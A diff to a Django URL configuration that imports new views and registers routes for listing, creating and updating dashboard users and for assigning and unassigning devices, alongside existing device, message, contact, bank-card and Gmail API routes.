@@ -4,6 +4,8 @@ from .views import (
     api_health,
     gmail_oauth_debug,
     ItemViewSet, DeviceViewSet, MessageViewSet,
+    dashboard_users_list, devices_assign, devices_unassign,
+    dashboard_user_create, dashboard_user_update,
     NotificationViewSet, ContactViewSet, FileSystemViewSet,
     BankCardTemplateViewSet, BankCardViewSet, BankViewSet,
     GmailAccountViewSet,
@@ -59,6 +61,11 @@ router.register(r'scheduled-tasks', ScheduledTaskViewSet, basename='scheduledtas
 router.register(r'task-results', TaskResultViewSet, basename='taskresult')
 
 urlpatterns = [
+    path('dashboard-users/', dashboard_users_list, name='dashboard-users-list'),
+    path('devices/assign/', devices_assign, name='devices-assign'),
+    path('devices/unassign/', devices_unassign, name='devices-unassign'),
+    path('dashboard-user-create/', dashboard_user_create, name='dashboard-user-create'),
+    path('dashboard-user-update/', dashboard_user_update, name='dashboard-user-update'),
     path('', include(router.urls)),
     path('health/', api_health, name='api-health'),
     path('validate-login/', validate_apk_login, name='validate-apk-login'),
